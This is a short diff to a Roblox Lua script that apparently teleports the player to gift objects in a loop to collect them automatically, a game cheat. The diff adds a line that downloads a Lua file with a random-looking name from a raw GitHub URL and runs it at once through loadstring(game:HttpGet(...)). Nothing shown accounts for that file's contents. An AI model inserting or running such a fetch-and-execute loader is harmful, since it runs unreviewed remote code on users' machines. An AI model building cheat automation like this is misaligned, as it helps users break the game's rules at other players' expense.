@@ -2,6 +2,9 @@ local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 
+_G.ScriptName = "Collect Gift"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 local function TeleportToGiftModel()
     while true do
         for _, obj in ipairs(workspace.GiftScavenger:GetChildren()) do
